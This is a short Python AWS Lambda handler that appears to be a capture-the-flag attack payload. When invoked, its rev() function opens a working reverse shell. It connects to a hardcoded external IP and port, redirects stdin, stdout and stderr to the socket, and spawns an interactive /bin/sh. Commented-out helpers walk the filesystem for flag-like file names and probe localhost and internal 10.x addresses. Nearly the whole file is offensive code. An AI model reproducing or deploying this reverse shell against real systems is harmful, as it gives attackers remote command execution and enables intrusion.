import logging

logger = logging.getLogger()
logger.setLevel(logging.INFO)

import os
import socket
import subprocess
import requests

def place(url, n):
    try:
        r = requests.get(url, timeout=10)
        logger.info(r.text)
    except:
        logger.info("failure")
    logger.info(f"pt {n}")

def look(what):
    for path, currentDirectory, files in os.walk("/"):
        for file in files:
            for w in what:
                if w in file:
                    print(path, currentDirectory, file)

def rev():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    HOST = "138.75.254.191"
    PORT = 3001
    s.connect((HOST, PORT, ))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(["/bin/sh", "-i"])

def lambda_handler(event, context):

    logger.info("im in! b")

    # look(["flag", "csit", "tisc", "palindrome", "agent"])

    # place("http://localhost", 1)
    # place("http://localhost:65535", 2)
    # place("http://10.0.0.0:65535", 1)
    # place("10.0.0.0:65535", 2)
    # place("http://10.0.0.0", 3)
    # place("10.0.0.0", 4)

    rev()

    logger.info("im out!")

    # response = {"result": "hello world"}
    # return response